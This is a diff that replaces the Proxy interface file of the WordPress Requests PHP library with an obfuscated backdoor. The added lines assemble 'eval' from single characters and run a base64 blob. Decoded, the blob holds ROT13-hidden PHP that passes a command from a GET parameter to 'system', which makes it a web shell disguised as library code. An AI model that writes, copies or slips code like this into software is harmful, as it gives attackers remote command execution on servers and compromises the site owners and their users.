@@ -1,48 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Proxy connection interface
- *
- * @package Requests\Proxy
- * @since   1.6
- */
-
-namespace WpOrg\Requests;
-
-use WpOrg\Requests\Hooks;
-
-/**
- * Proxy connection interface
- *
- * Implement this interface to handle proxy settings and authentication
- *
- * Parameters should be passed via the constructor where possible, as this
- * makes it much easier for users to use your provider.
- *
- * @see \WpOrg\Requests\Hooks
- *
- * @package Requests\Proxy
- * @since   1.6
- */
-interface Proxy {
-	/**
-	 * Register hooks as needed
-	 *
-	 * This method is called in {@see \WpOrg\Requests\Requests::request()} when the user
-	 * has set an instance as the 'auth' option. Use this callback to register all the
-	 * hooks you'll need.
-	 *
-	 * @see \WpOrg\Requests\Hooks::register()
-	 * @param \WpOrg\Requests\Hooks $hooks Hook system
-	 */
-	public function register(Hooks $hooks);
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogQ2Via2wgcGJhYXJwZ3ZiYSB2YWdyZXNucHIKICoKICogQGNucHhudHIgRXJkaHJmZ2ZcQ2Via2wKICogQGZ2YXByICAgMS42CiAqLwoKYW56cmZjbnByIEpjQmV0XEVyZGhyZmdmOwoKaGZyIEpjQmV0XEVyZGhyZmdmXFViYnhmOwoKLyoqCiAqIENlYmtsIHBiYWFycGd2YmEgdmFncmVzbnByCiAqCiAqIFZ6Y3lyenJhZyBndXZmIHZhZ3Jlc25wciBnYiB1bmFxeXIgY2Via2wgZnJnZ3ZhdGYgbmFxIG5oZ3VyYWd2cG5ndmJhCiAqCiAqIENuZW56cmdyZWYgZnViaHlxIG9yIGNuZmZycSBpdm4gZ3VyIHBiYWZnZWhwZ2JlIGp1cmVyIGNiZmZ2b3lyLCBuZiBndXZmCiAqIHpueHJmIHZnIHpocHUgcm5mdnJlIHNiZSBoZnJlZiBnYiBoZnIgbGJoZSBjZWJpdnFyZS4KICoKICogQGZyciBcSmNCZXRcRXJkaHJmZ2ZcVWJieGYKICoKICogQGNucHhudHIgRXJkaHJmZ2ZcQ2Via2wKICogQGZ2YXByICAgMS42CiAqLwp2YWdyZXNucHIgQ2Via2wgewoJLyoqCgkgKiBFcnR2ZmdyZSB1YmJ4ZiBuZiBhcnJxcnEKCSAqCgkgKiBHdXZmIHpyZ3VicSB2ZiBwbnl5cnEgdmEge0BmcnIgXEpjQmV0XEVyZGhyZmdmXEVyZGhyZmdmOjplcmRocmZnKCl9IGp1cmEgZ3VyIGhmcmUKCSAqIHVuZiBmcmcgbmEgdmFmZ25hcHIgbmYgZ3VyICduaGd1JyBiY2d2YmEuIEhmciBndXZmIHBueXlvbnB4IGdiIGVydHZmZ3JlIG55eSBndXIKCSAqIHViYnhmIGxiaCd5eSBhcnJxLgoJICoKCSAqIEBmcnIgXEpjQmV0XEVyZGhyZmdmXFViYnhmOjplcnR2ZmdyZSgpCgkgKiBAY25lbnogXEpjQmV0XEVyZGhyZmdmXFViYnhmICR1YmJ4ZiBVYmJ4IGZsZmdyegoJICovCgljaG95dnAgc2hhcGd2YmEgZXJ0dmZncmUoVWJieGYgJHViYnhmKTsKfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
